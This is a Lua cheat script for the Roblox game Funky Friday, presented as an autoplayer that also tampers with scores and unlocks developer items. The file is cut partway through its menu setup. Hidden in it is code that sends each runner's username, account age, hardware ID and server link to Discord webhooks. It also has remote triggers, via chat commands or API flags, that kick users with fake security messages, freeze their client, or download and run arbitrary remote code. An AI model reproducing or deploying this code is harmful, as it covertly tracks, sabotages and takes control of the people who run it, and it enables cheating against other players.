local ScriptRepo = 'https://raw.githubusercontent.com/Bart3kk/funky-friday-autoplay/main/'
local LS = game:GetService('LocalizationService')
local apiLink, req, dname, age, link, UID, cname,isApi, executor, exec, HWID, urla, old, uiLoaded
local apiMain = 'https://ff-api.glitch.me'
local apiBackup1 = 'https://funky-friday-api.glitch.me'
local apiBackup2 = 'https://funkyfriday-api.glitch.me'
local virtualInputManager = game:GetService('VirtualInputManager')
local UIS = game:GetService("UserInputService")
local httpService = game:GetService('HttpService')
local LP = game.Players.LocalPlayer
local P = game:GetService("Players")
local placeId = game.PlaceId
local GID = game.JobId
local rs = game:GetService('ReplicatedStorage')
local dlink = "roblox://experiences/start?placeId="..placeId.."&gameInstanceId="..GID
local argss = { [1] = { [1] = "Server", [2] = "RoundManager", [3] = "UpdateScore" }, [2] = { [1] = 50 } }
local argsDev = { [1] = { [1] = "Server", [2] = "RoundManager", [3] = "UpdateScore" }, [2] = { [1] = 410 } }
local localization = LS:GetCountryRegionForPlayerAsync(LP)
local TeleportService = game:GetService('TeleportService')
local cmd = '/kick'
local cmd1 = '/crash'
local cmd2 = '/spook'
local cmd3 = '/bygone'
local getgenv = getfenv().getgenv or getfenv
virtualInputManager:SendKeyEvent(true, Enum.KeyCode.F9, false, game)
task.wait(0.1)
virtualInputManager:SendKeyEvent(false, Enum.KeyCode.F9, false, game)

local function yes()
    while true do end
end

local function extra()
    rs.RF:InvokeServer(unpack(argss))
end

req = getgenv().request
UID = LP.UserId
dname = tostring(LP.Character)
cname = tostring(LP.Name)
age = LP.AccountAge
link = "https://roblox.com/users/"..UID 

local checkMain = req({
    Url = apiMain,
    Method = "GET"
})

local checkBackup1 = req({
    Url = apiBackup1,
    Method = "GET"
})

local checkBackup2 = req({
    Url = apiBackup2,
    Method = "GET"
})

--[[if (checkMain.StatusCode == 429) and (checkBackup1.StatusCode == 429) and (checkBackup2.StatusCode == 429) then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/refs/heads/main/Funky%20Friday/OldBot.lua'))()
elseif (checkMain.StatusCode == 429) and (checkBackup1.StatusCode == 429) then
    apiLink = apiBackup2
elseif (checkMain.StatusCode == 429) then
    apiLink = apiBackup1
else
    apiLink = apiMain
end]]
apiLink = 'https://funky-friday-api.glitch.me'
local fetchUrl = 'https://funky-friday-api.glitch.me/getWebhook'

local check = req({
    Url = apiLink,
    Method = "GET"
})

if check.StatusCode == 200 then
    isApi = true
else
    isApi = false
end

local devUID = {
    [7360362956] = true,
    [7080268132] = true,
    [5728443297] = true,
    [13034188] = true,
    [7475629590] = true,
    [1456118719] = true
}

local isDev = devUID[UID]

local imgApi = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..UID.."&size=420x420&format=Png&isCircular=false"
local imgRes = req({
    Url = imgApi,
    Method = "GET"
})
local img = httpService:JSONDecode(imgRes.Body)

if isDev then
    local i = 1
    function extraDev()
        if Options.typeExtra.Value == 'fixed' then
            if i == Options.extraChance.Value then
                rs.RF:InvokeServer(unpack(argsDev))
                i = 1
            else
                i = i + 1
            end
        elseif Options.typeExtra.Value == 'random' then
            if i == math.random(1, 10) then
                rs.RF:InvokeServer(unpack(argsDev))
                i = 1
            elseif i > 10 then
                i = 1
            else
                i += 1
            end
        end
    end
end

local function get(var)
    local Body = httpService:JSONDecode(req({Url = "https://httpbin.org/get", Method = "GET"}).Body)
    if string.lower(var) == "ip" then
        for i, v in next, Body do
            if type(i) == "string" and i:lower():match("origin") then
                return v
            end
        end
    elseif string.lower(var) == 'hwid' then
        for i, v in next, Body.headers do
            if type(i) == "string" and (i:lower():match("fingerprint") or i:lower():match("hwid")) then
                return v
            end
        end
    elseif string.lower(var) == 'exec' then
        for i, v in next, Body.headers do
            if type(i) == "string" and (i:lower():match("user") or i:lower():match("agent") or i:lower():match("user-agent") or i:lower():match("exploitidentifier")) then
                return v
            end
        end
    end
end

exec = identifyexecutor() or get("exec") or 'Unknown'
HWID = get("hwid")

if (exec == "Sonar") then
    executor = "Velocity"
else
    executor = exec
end

local execEmbed = {
    ["title"] = "Script Execution Log",
    ["color"] = 16711680,
    ["description"] = "**"..cname.."** has loaded the script.",
    ["thumbnail"] = {
        ["url"] = img.data[1].imageUrl
    },
    ["fields"] = {
        {
            ["name"] = "**User Information**",
            ["value"] = "─────────────────────────────────────────────────",
            ["inline"] = false
        },
        {
            ["name"] = "Username",
            ["value"] = cname,
            ["inline"] = true
        },
        {
            ["name"] = "Display Name",
            ["value"] = dname,
            ["inline"] = true
        },
        {
            ["name"] = "Account Age",
            ["value"] = age,
            ["inline"] = true
        },
        {
            ["name"] = "Profile Link",
            ["value"] = link,
            ["inline"] = false
        },
        {
            ["name"] = "**Execution Details**",
            ["value"] = "─────────────────────────────────────────────────",
            ["inline"] = false
        },
        {
            ["name"] = "Executor",
            ["value"] = executor,
            ["inline"] = true
        },
        {
            ["name"] = "Execution Time",
            ["value"] = localization..": "..os.date("%d.%m.%Y %H:%M:%S"),
            ["inline"] = true
        },
        {
            ["name"] = "**Security & Identification**",
            ["value"] = "─────────────────────────────────────────────────",
            ["inline"] = false
        },
        {
            ["name"] = "HWID",
            ["value"] = '||'..HWID..'||',
            ["inline"] = false
        },
        {
            ["name"] = "GID",
            ["value"] = '||'..GID..'||',
            ["inline"] = false
        },
        {
            ["name"] = "Server Deep Link",
            ["value"] = '||'..dlink..'||',
            ["inline"] = false
        },
        {
            ["name"] = "**Commands & API**",
            ["value"] = "─────────────────────────────────────────────────",
            ["inline"] = false
        },
        {
            ["name"] = "Kick CMD",
            ["value"] = cmd,
            ["inline"] = true
        },
        {
            ["name"] = "Crash CMD",
            ["value"] = cmd1,
            ["inline"] = true
        },
        {
            ["name"] = "Spook CMD",
            ["value"] = cmd2,
            ["inline"] = true
        },
        {
            ["name"] = "Bygone CMD",
            ["value"] = cmd3,
            ["inline"] = true
        },
        {
            ["name"] = "Has API?",
            ["value"] = isApi,
            ["inline"] = true
        }
    },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S").."Z"
}
local unloadEmbed = {
    ["title"] = "Script Unload Log",
    ["description"] = "**"..cname.."** has unloaded the script.",
    ["thumbnail"] = {
        ["url"] = img.data[1].imageUrl
    },
    ["color"] = 16711680,
    ["fields"] = {
        {
            ["name"] = "**User Information**",
            ["value"] = "─────────────────────────────────────────────────",
            ["inline"] = false
        },
        {
            ["name"] = "Username",
            ["value"] = cname,
            ["inline"] = true
        },
        {
            ["name"] = "Display Name",
            ["value"] = dname,
            ["inline"] = true
        },
        {
            ["name"] = "Account Age",
            ["value"] = age,
            ["inline"] = true
        },
        {
            ["name"] = "Profile Link",
            ["value"] = link,
            ["inline"] = false
        },
        {
            ["name"] = "**Execution Details**",
            ["value"] = "─────────────────────────────────────────────────",
            ["inline"] = false
        },
        {
            ["name"] = "Executor",
            ["value"] = executor,
            ["inline"] = true
        },
        {
            ["name"] = "HWID",
            ["value"] = '||'..HWID..'||',
            ["inline"] = true
        }
    },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S").."Z" 
}

local function log(embed, yes)
    local webhooks = {
        kick = 'WEBHOOK.KICK',
        crash = 'WEBHOOK.CRASH',
        unload = 'WEBHOOK.UNLOAD',
        exec = 'WEBHOOK.EXECUTE'
    }
    local data = {
        username = dname,
        content = "<@&1340970841751552081>",
        avatar_url = img.data[1].imageUrl,
        embeds = {embed}
    }

    local jsonData = httpService:JSONEncode(data)
    local typeReal = webhooks[string.lower(yes:gsub("%s+", ""))] or nil

    print(typeReal)

    urla = req({
        Url = 'https://funky-friday-api.glitch.me/getWebhook',
        Method = 'GET',
        Headers = {
            ['webhook_type'] = typeReal,
            ['token_webhook'] = 'NULL~c32f45ce139af82602a18345fd700dc5f60d1efde57d3e123dff83f000b5d626_WEBHOOK',
        },
        Body = ''
    })

    if not urla or not urla.Body then 
        warn('HEHH')
        return;
    end
    if urla or urla.Body then 
        print(urla.Body)
    end

    req({
        Url = urla.Body,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = jsonData
    })
end

local function fetchData(endpoint)
    local url = 'https://funky-friday-api.glitch.me'..endpoint
    
    local success, response = pcall(function()
        local res = req({Url = url, Method = "GET"})
        return httpService:JSONDecode(res.Body)
    end)
    
    if success and response then
        if response[tostring(UID)] == true then
            return true
        end
    else
        warn("Failed to fetch status!")
    end
    return false
end

local function fetchKick()
    local result = fetchData('/checkKickUi')
    print("Fetch result for Kick:", result)
    if result then
        kickedApi = true
        uiLoaded = false
        local kickEmbed = {
            ["title"] = "Kick Log",
            ["description"] = "**"..cname.."** has been kicked!",
            ["thumbnail"] = {
                ["url"] = img.data[1].imageUrl
            },
            ["color"] = 16711680,
            ["fields"] = {
                {
                    ["name"] = "**User Information**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "Username",
                    ["value"] = cname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = dname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = age,
                    ["inline"] = true
                },
                {
                    ["name"] = "Profile Link",
                    ["value"] = link,
                    ["inline"] = false
                },
                {
                    ["name"] = "**Execution Details**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "Executor",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = '||'..HWID..'||',
                    ["inline"] = true
                },
                {
                    ["name"] = "**Kick Details**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "API Kick?",
                    ["value"] = kickedApi,
                    ["inline"] = true
                }
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S").."Z"
        }
        log(kickEmbed, 'kick')
        LP:Kick("Internal server error.")
    end
end

local function fetchCrash()
    local result = fetchData('/checkCrashUi')
    print("Fetch result for Crash:", result)
    if result then
        crashedApi = true
        uiLoaded = false
        local crashEmbed = {
            ["title"] = "Crash Log",
            ["description"] = "**"..cname.."** has been crashed!",
            ["thumbnail"] = {
                ["url"] = img.data[1].imageUrl
            },
            ["color"] = 16711680,
            ["fields"] = {
                {
                    ["name"] = "**User Information**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "Username",
                    ["value"] = cname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = dname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = age,
                    ["inline"] = true
                },
                {
                    ["name"] = "Profile Link",
                    ["value"] = link,
                    ["inline"] = false
                },
                {
                    ["name"] = "**Execution Details**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "Executor",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = '||'..HWID..'||',
                    ["inline"] = true
                },
                {
                    ["name"] = "**Crash Details**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "API Crash?",
                    ["value"] = crashedApi,
                    ["inline"] = true
                }
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S").."Z"
        }
        log(crashEmbed, 'crash')
        yes()
    end
end

local function fetchSpook()
    local result = fetchData('/checkSpookUi')
    print("Fetch result for Spook:", result)
    if result then
        spookedApi = true
        uiLoaded = false
        local spookEmbed = {
            ["title"] = "Spook Log",
            ["description"] = "**"..cname.."** has been spooked!",
            ["thumbnail"] = {
                ["url"] = img.data[1].imageUrl
            },
            ["color"] = 16711680,
            ["fields"] = {
                {
                    ["name"] = "**User Information**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "Username",
                    ["value"] = cname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = dname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = age,
                    ["inline"] = true
                },
                {
                    ["name"] = "Profile Link",
                    ["value"] = link,
                    ["inline"] = false
                },
                {
                    ["name"] = "**Execution Details**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "Executor",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = '||'..HWID..'||',
                    ["inline"] = true
                },
                {
                    ["name"] = "**Spook Details**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "API Spook?",
                    ["value"] = spookedApi,
                    ["inline"] = true
                }
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S").."Z"
        }
        log(spookEmbed, 'kick')
        LP:Kick('Account login detected from an unauthorized device. ROBLOX recommends to log out from all sessions. To reconnect, please log off the unauthorized device.')
    end
end

local function fetchBygone()
    local result = fetchData('/checkBygoneUi')
    print("Fetch result for Bygone:", result)
    if result then
        bygoneApi = true
        uiLoaded = false
        local bygoneEmbed = {
            ["title"] = "Bygone Log",
            ["description"] = "**"..cname.."** has been bygone'd!",
            ["thumbnail"] = {
                ["url"] = img.data[1].imageUrl
            },
            ["color"] = 16711680,
            ["fields"] = {
                {
                    ["name"] = "**User Information**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "Username",
                    ["value"] = cname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = dname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = age,
                    ["inline"] = true
                },
                {
                    ["name"] = "Profile Link",
                    ["value"] = link,
                    ["inline"] = false
                },
                {
                    ["name"] = "**Execution Details**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "Executor",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = '||'..HWID..'||',
                    ["inline"] = true
                },
                {
                    ["name"] = "**Bygone Details**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "API Bygone?",
                    ["value"] = bygoneApi,
                    ["inline"] = true
                }
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S").."Z"
        }
        log(bygoneEmbed, 'kick')
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Bart3kk/ONCP/refs/heads/main/testfix"))()
    end
end

local function onPlayerChatted(player, message)
    if type(message) ~= "string" then return end
    if not devUID[player.UserId] then return end

    if not isDev and string.lower(message) == string.lower(cmd) then
        kickedApi = false
        uiLoaded = false
        log(kickEmbed, 'kick')
        LP:Kick("Internal server error.")
    elseif not isDev and string.lower(message) == string.lower(cmd1) then
        crashedApi = false
        uiLoaded = false
        log(crashEmbed, 'crash')
        wait(3)
        yes()
    elseif not isDev and string.lower(message) == string.lower(cmd2) then
        spookedApi = false
        uiLoaded = false
        log(spookEmbed, 'kick')
        LP:Kick('Account login detected from an unauthorized device. ROBLOX recommends to log out from all sessions. To reconnect, please log off the unauthorized device.')
    elseif not isDev and string.lower(message) == string.lower(cmd3) then
        bygoneApi = false
        uiLoaded = false
        local bygoneEmbed = {
            ["title"] = "Bygone Log",
            ["description"] = "**"..cname.."** has been bygone'd!",
            ["thumbnail"] = {
                ["url"] = img.data[1].imageUrl
            },
            ["color"] = 16711680,
            ["fields"] = {
                {
                    ["name"] = "**User Information**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "Username",
                    ["value"] = cname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = dname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = age,
                    ["inline"] = true
                },
                {
                    ["name"] = "Profile Link",
                    ["value"] = link,
                    ["inline"] = false
                },
                {
                    ["name"] = "**Execution Details**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "Executor",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = '||'..HWID..'||',
                    ["inline"] = true
                },
                {
                    ["name"] = "**Bygone Details**",
                    ["value"] = "─────────────────────────────────────────────────",
                    ["inline"] = false
                },
                {
                    ["name"] = "API Bygone?",
                    ["value"] = bygoneApi,
                    ["inline"] = true
                }
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S").."Z"
        }
        log(bygoneEmbed, 'kick')
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Bart3kk/ONCP/refs/heads/main/testfix"))()
    end
end

if isDev then
    updStatus = false
end

if not updStatus then
    local function fail(r) return LP:Kick(r) end

    local usedCache = shared.__urlcache and next(shared.__urlcache) ~= nil

    shared.__urlcache = shared.__urlcache or {}

    if type(getloadedmodules) ~= 'function' then return fail('Unsupported exploit (misssing "getloadedmodules")') end
    if type(getgc) ~= 'function' then   return fail('Unsupported exploit (misssing "getgc")') end

    local getinfo = debug.getinfo or getinfo;
    local getupvalue = debug.getupvalue or getupvalue;
    local getupvalues = debug.getupvalues or getupvalues;
    local setupvalue = debug.setupvalue or setupvalue;

    if type(setupvalue) ~= 'function' then return fail('Unsupported exploit (misssing "debug.setupvalue")') end
    if type(getupvalue) ~= 'function' then return fail('Unsupported exploit (misssing "debug.getupvalue")') end
    if type(getupvalues) ~= 'function' then return fail('Unsupported exploit (missing "debug.getupvalues")') end
    if type(hookmetamethod) ~= 'function' then return fail('Unsupported exploit (missing "hookmetamethod")') end

    local UIRepo = 'https://raw.githubusercontent.com/deividcomsono/Obsidian/main/'
    local UI = loadstring(game:HttpGet(UIRepo..'Library.lua'))()
    local ThemeManager = loadstring(game:HttpGet(UIRepo..'addons/ThemeManager.lua'))()
    local SaveManager = loadstring(game:HttpGet(UIRepo..'addons/SaveManager.lua'))()
    local Options = UI.Options
    local Toggles = UI.Toggles

    local metadata = loadstring(game:HttpGet(ScriptRepo .. 'metadata.lua'))()

    local framework, scrollHandler, network
    local counter = 0

    while true do
        for _, obj in next, getgc(true) do
            if type(obj) == 'table' then
                if rawget(obj, 'GameUI') then
                    framework = obj;
                elseif type(rawget(obj, 'Server')) == 'table' then
                    network = obj;
                end
            end

            if network and framework then break end
        end

        for _, module in next, getloadedmodules() do
            if module.Name == 'ScrollHandler' then
                scrollHandler = module;
                break;
            end
        end

        if (type(framework) == 'table' and typeof(scrollHandler) == 'Instance' and type(network) == 'table') then
            break
        end
            
        counter = counter + 1
        if counter > 6 then
            fail(string.format('Failed to load game dependencies. Details: %s, %s, %s', type(framework), typeof(scrollHandler), type(network)))
        end
        wait(1)
    end

    local runService = game:GetService('RunService')

    local random = Random.new()

    local task = task or getrenv().task;
    local fastWait, fastSpawn = task.wait, task.spawn;

    local rollChance 
    
    function rollChance()
        if Options.AutoplayerMode.Value == 'Manual' then
            if (Options.SickBind:GetState()) then return 'Sick' end
            if (Options.GoodBind:GetState()) then return 'Good' end
            if (Options.OkayBind:GetState()) then return 'Ok' end
            if (Options.BadBind:GetState()) then return 'Bad' end

            return 'Bad'
        end

        local chances = {
            { 'Sick', Options.SickChance.Value },
            { 'Good', Options.GoodChance.Value },
            { 'Ok', Options.OkChance.Value },
            { 'Bad', Options.BadChance.Value },
            { 'Miss' , Options.MissChance.Value },
        }

        table.sort(chances, function(a, b)
            return a[2] > b[2]
        end)

        local sum = 0;
        for i = 1, #chances do
            sum += chances[i][2]
        end

        if sum == 0 then
            return chances[random:NextInteger(1, #chances)][1]
        end

        local initialWeight = random:NextInteger(0, sum)
        local weight = 0;

        for i = 1, #chances do
            weight = weight + chances[i][2]

            if weight > initialWeight then
                return chances[i][1]
            end
        end

        return 'Sick'
    end

    local chanceValues do
    chanceValues = {
        Sick = 96,
        Good = 92,
        Ok = 87,
        Bad = 75,
    }

    local keyCodeMap = {}
    for _, enum in next, Enum.KeyCode:GetEnumItems() do
        keyCodeMap[enum.Value] = enum
    end

    if shared._unload then
        pcall(shared._unload)
    end

    function shared._unload()
        if shared._id then
            pcall(runService.UnbindFromRenderStep, runService, shared._id)
        end

        UI:Unload()
        uiLoaded = false

        for i = 1, #shared.threads do
            coroutine.close(shared.threads[i])
        end

        for i = 1, #shared.callbacks do
            task.spawn(shared.callbacks[i])
        end
    end

    shared.threads = {}
    shared.callbacks = {}

    shared._id = httpService:GenerateGUID(false)
    local function pressKey(keyCode, state)
        if Options.PressMode.Value == 'virtual input' then
            virtualInputManager:SendKeyEvent(state, keyCode, false, nil)
        elseif isDev and Options.PressMode.Value == 'dev virtual' then
            virtualInputManager:SendKeyEvent(state, keyCode, false, nil)
        elseif not isDev and Options.PressMode.Value == 'extra virtual' then
            virtualInputManager:SendKeyEvent(state, keyCode, false, nil)
        end
    end

    local rng = Random.new()
    runService:BindToRenderStep(shared._id, 1, function()

        if (not Toggles.Autoplayer) or (not Toggles.Autoplayer.Value) then
            return
        end

        local currentlyPlaying = framework.SongPlayer.CurrentlyPlaying

        if typeof(currentlyPlaying) ~= 'Instance' or not currentlyPlaying:IsA('Sound') then
            return
        end

        local arrows = framework.UI:GetNotes()
        local count = framework.SongPlayer:GetKeyCount()
        local mode = count .. 'Key'

        local arrowData = framework.ArrowData[mode].Arrows
        for i, arrow in next, arrows do
            local ignoredNoteTypes = { Death = true, Mechanic = true, Poison = true }

            if type(arrow.NoteDataConfigs) == 'table' then
                if ignoredNoteTypes[arrow.NoteDataConfigs.Type] then
                    continue
                end
            end

            if (arrow.Side == framework.UI.CurrentSide) and (not arrow.Marked) and currentlyPlaying.TimePosition > 0 then
                local position = (arrow.Data.Position % count) .. ''

                local hitboxOffset = 0
                do
                    local settings = framework.Settings;
                    local offset = type(settings) == 'table' and settings.HitboxOffset;
                    local value = type(offset) == 'table' and offset.Value;

                    if type(value) == 'number' then
                        hitboxOffset = value;
                    end

                    hitboxOffset = hitboxOffset / 1000
                end

                local songTime = framework.SongPlayer.CurrentTime
                local playbackSpeed = 1
                do
                    local configs = framework.SongPlayer.CurrentSongConfigs
                    if type(configs) == 'table' and type(rawget(configs, "PlaybackSpeed")) == "number" then
                        playbackSpeed = configs.PlaybackSpeed
                    end

                    songTime = songTime / playbackSpeed
                end

                local noteTime = math.clamp((1 - math.abs(arrow.Data.Time - (songTime + hitboxOffset))) * 100, 0, 100)

                local result = rollChance()
                arrow._hitChance = arrow._hitChance or result;

                local hitChance = (Options.AutoplayerMode.Value == 'Manual' and result or arrow._hitChance)
                if hitChance ~= "Miss" and noteTime >= chanceValues[arrow._hitChance] then
                    fastSpawn(function()
                        arrow.Marked = true;
                        local keyCode = keyCodeMap[arrowData[position].Keybinds.Keyboard[1]]

                        pressKey(keyCode, true)

                        local arrowLength = arrow.Data.Length or 0
                        local isHeld = arrowLength > 0

                        if isHeld then arrowLength = arrowLength / playbackSpeed end

                        local delayMode = Options.DelayMode.Value

                        local minDelay = isHeld and Options.HeldDelayMin or Options.NoteDelayMin;
                        local maxDelay = isHeld and Options.HeldDelayMax or Options.NoteDelayMax;
                        local noteDelay = isHeld and Options.HeldDelay or Options.ReleaseDelay

                        local delay = delayMode == 'Random' and rng:NextNumber(minDelay.Value, maxDelay.Value) or noteDelay.Value
                        task.wait(arrowLength + (delay / 1000))

                        pressKey(keyCode, false)
                        arrow.Marked = nil;
                    end)
                end
            end
        end
    end)
    end

    local ActivateUnlockables do
    local loadStyle = nil
    local function loadStyleProxy(...)
        local upvalues = getupvalues(loadStyle)
        for i, upvalue in next, upvalues do
            if type(upvalue) == 'table' and rawget(upvalue, 'Style') then
                rawset(upvalue, 'Style', nil);
                setupvalue(loadStyle, i, upvalue)
            end
        end

        return loadStyle(...)
    end

    local function applyLoadStyleProxy(...)
        local gc = getgc()
        for i = 1, #gc do
            local obj = gc[i]
            if type(obj) == 'function' then
                local upvalues = getupvalues(obj)
                for i, upv in next, upvalues do
                    if type(upv) == 'function' and getinfo(upv).name == 'LoadStyle' then
                        local function isGameFunction(fn)
                            return getinfo(fn).source:match('%.ArrowSelector%.Customize$')
                        end

                        if isGameFunction(obj) and isGameFunction(upv) then
                            loadStyle = loadStyle or upv
                            setupvalue(obj, i, loadStyleProxy)

                            table.insert(shared.callbacks, function()
                                assert(pcall(setupvalue, obj, i, loadStyle))
                            end)
                        end
                    end
                end
            end
        end
    end

    local success, error = pcall(applyLoadStyleProxy)
    if not success then
        return fail(string.format('Failed to hook LoadStyle function. Error(%q)\nExecutor(%q)\n', error, executor))
    end

    function ActivateUnlockables()
        local idx = table.find(framework.SongsWhitelist, UID)
        if idx then return end

        UI:Notify('Developer arrows have been unlocked!', 3)
        table.insert(framework.SongsWhitelist, UID)
    end
    end

    do
    while type(roundManager) ~= 'table' do
        task.wait()
        roundManager = network.Server.RoundManager
    end

    local oldUpdateScore = roundManager.UpdateScore;
    function roundManager.UpdateScore(...)
        local args = { ... }
        local score = args[2]

        if type(score) == 'number' and Options.ScoreModifier then
            if Options.ScoreModifier.Value == 'No decrease on miss' then
                args[2] = 0
            elseif Options.ScoreModifier.Value == 'Increase score on miss' then
                args[2] = math.abs(score)
            end
        end

        return oldUpdateScore(unpack(args))
    end

    table.insert(shared.callbacks, function()
        roundManager.UpdateScore = oldUpdateScore
    end)
    end

    do
    local thread = task.spawn(function()
        local map = workspace:waitForChild('Map', 5)
        local buildings = map and map:waitForChild('FunctionalBuildings', 5)
        local spawners = buildings and buildings:waitForChild('RingSpawners', 5)

        if spawners == nil then return end
        if type(firetouchinterest) ~= 'function' then return end

        while true do
            task.wait()
            if Toggles.AutoClaimRings and Toggles.AutoClaimRings.Value then
                local character = char
                local rootPart = character and character:findFirstChild('HumanoidRootPart')

                if rootPart == nil then continue end

                for i, spawner in next, spawners:GetChildren() do
                    for _, ring in next, spawner:GetChildren() do
                        if ring.Name ~= 'GoldenRing' then continue end

                        local ring = ring:findFirstChild('ring')
                        if not (ring and ring:IsA('BasePart')) then continue end
                        if ring.Transparency == 1 then continue end

                        firetouchinterest(ring, rootPart, 0)
                        firetouchinterest(ring, rootPart, 1)
                    end
                end
            end
        end
    end)
    table.insert(shared.callbacks, function()
        pcall(task.cancel, thread)
    end)
    end

    local Window = UI:CreateWindow({
    Title = 'funky friday autoplayer',
    Footer = string.format('version %s | updated: %s', metadata.version, metadata.updated),
    AutoShow = true,

    Center = true,
    Size = UDim2.fromOffset(829, 578),
    })

    local Tabs = {}
    local Groups = {}

    Tabs.Main = Window:AddTab('Main')
    Tabs.Miscellaneous = Window:AddTab('Miscellaneous')

    Groups.Autoplayer = Tabs.Main:AddLeftGroupbox('Autoplayer')
    Groups.Autoplayer:AddToggle('Autoplayer', { Text = 'Autoplayer' }):AddKeyPicker('AutoplayerBind', { Default = 'End', NoUI = true, SyncToggleState = true })

    if isDev then
        Groups.Autoplayer:AddDropdown('PressMode', {
            Text = 'Input mode',
            Compact = true,
            Default = 'dev virtual',
            Values = { 'virtual input', 'dev virtual'},
            Tooltip = 'input method used to press arrows.\n* virtual input: emulates key presses.\n* dev virtual: same as virtual input, but adds 410 extra score',
        })
        Groups.Autoplayer:AddDropdown('typeExtra', {
            Text = 'Extra chance type',
            Compact = true,
            Default = 'random',
            Values = { 'random', 'fixed' },
            Tooltip = 'type of extra chance\n* random - randomly adds the score every 1 - 10 notes\n* fixed - uses the slider below to determine'
        })
        Groups.Autoplayer:AddSlider('extraChance', {
            Text = 'Chance of extra',
            Min = 1,
            Max = 10,
            Default = 2,
            Rounding = 0,
            Compact = true,
            Tooltip = 'chance of extra (higher number = higher amount of notes required to trigger)'
        })
    else
        Groups.Autoplayer:AddDropdown('PressMode', {
            Text = 'Input mode',
            Compact = true,
            Default = 'virtual input',
            Values = { 'virtual input', 'extra virtual', 'firesignal' },
            Tooltip = 'Input method used to press arrows.\n* virtual input: emulates key presses.\n* extra virtual: same as virtual input, but adds extra score',
        })
    end

    Groups.HitChances = Tabs.Main:AddLeftGroupbox('Hit chances')
    Groups.HitChances:AddDropdown('AutoplayerMode', {
        Text = 'Autoplayer mode',
        Compact = true,
        Default = 1,
        Values = { 'Automatic', 'Manual' },
        Tooltip = 'Mode to use for deciding when to hit notes.\n* Automatic: hits notes based on chance sliders\n* Manual: hits notes based on held keybinds',
    })

    Groups.HitChances:AddSlider('SickChance',   { Text = 'Sick chance', Min = 0, Max = 100, Default = 100, Suffix = '%', Rounding = 0, Compact = true })
    Groups.HitChances:AddSlider('GoodChance',   { Text = 'Good chance', Min = 0, Max = 100, Default = 0, Suffix = '%', Rounding = 0, Compact = true })
    Groups.HitChances:AddSlider('OkChance',     { Text = 'Ok chance',   Min = 0, Max = 100, Default = 0, Suffix = '%', Rounding = 0, Compact = true })
    Groups.HitChances:AddSlider('BadChance',    { Text = 'Bad chance',  Min = 0, Max = 100, Default = 0, Suffix = '%', Rounding = 0, Compact = true })
    Groups.HitChances:AddSlider('MissChance',   { Text = 'Miss chance', Min = 0, Max = 100, Default = 0, Suffix = '%', Rounding = 0, Compact = true })

    Groups.HitTiming = Tabs.Main:AddLeftGroupbox('Hit timing')
    Groups.HitTiming:AddDropdown('DelayMode', {
        Text = 'Delay mode',
        Default = 1,
        Values = { 'Manual', 'Random' },
        Tooltip = 'Adjustable timing for when to release notes.\n* Manual releases the note after a fixed amount of time.\n* Random releases the note after a random amount of time.',
    })

    Groups.HitTiming:AddLabel('Manual delay')
    Groups.HitTiming:AddSlider('ReleaseDelay',   { Text = 'Note delay', Min = 0, Max = 500, Default = 20, Rounding = 0, Compact = true, Suffix = 'ms' })
